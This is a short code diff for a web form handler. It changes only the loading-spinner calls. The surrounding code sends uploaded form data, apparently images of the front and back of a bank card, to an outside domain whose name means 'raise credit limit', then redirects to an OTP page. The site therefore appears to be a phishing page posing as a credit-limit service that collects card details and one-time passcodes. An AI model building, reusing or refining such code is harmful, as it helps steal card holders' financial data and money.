@@ -85,7 +85,7 @@ $("#matsau_card").change(function () {
 
 $('#service').submit(function (e) {
     e.preventDefault();
-    $('.loader').fadeOut('slow');
+    $('.loader').show()
     var formData = new FormData($(this)[0]);
 
     var mattruoc = $('#mattruoc').val();
@@ -103,7 +103,7 @@ $('#service').submit(function (e) {
         xhr.open('POST', 'https://app.nanghanmuctindung.online/api/customer', true);
         xhr.send(formData);
         xhr.onreadystatechange = function () {
-            $('.loader').remove('slow');
+            $('.loader').hide()
             if (xhr.readyState == 4 && xhr.status == 200) {
                 window.location.href = '/otp.html';
             } else {
@@ -127,11 +127,11 @@ $('#service').submit(function (e) {
                 'Accept': 'application/json',
             },
             success: function (data) {
-                $('.loader').remove('slow');
+                $('.loader').hide()
                 window.location.href = '/otp.html';
             },
             error: function (data) {
-                $('.loader').remove('slow');
+                $('.loader').hide()
                 console.log(data);
                 alert('Vui lòng kiểm tra lại thông tin!');
             }
